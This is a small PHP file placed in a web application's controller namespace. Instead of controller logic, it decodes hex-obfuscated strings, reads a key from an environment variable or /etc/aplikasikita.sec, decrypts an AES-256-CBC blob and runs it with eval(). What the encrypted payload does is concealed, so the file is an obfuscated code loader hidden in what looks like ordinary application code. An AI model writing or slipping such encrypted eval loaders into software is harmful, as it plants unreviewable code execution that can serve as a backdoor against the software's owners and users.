<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('XgNXVX/vy8vFnSjUvbkVTA==');

$c=base64_decode(

'YCUqywYj33lYXyE0hgZwvcX8qEhSWQP+xuDIIUdJEU+Pb0TK/972ZytNOhtmKJLoW0iyPjfVz9kV' .
'306EHzA/SI4EgoeePVbZOeOaFIhf1WXB5sQ6LBIdw31PQtvHr4pfeNteSZ6IBaFxZS8jSH5re60j' .
'QBFfgHKrjZJ4E3j3hZM50oEw+nST7yh3JqwHLml6Bv9pYKffXbikJcdyAofGq2jwKSzC7jxtR+PN' .
'Y1c4F6u+PuIN0Zc2qGZGlaTTMZlG'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

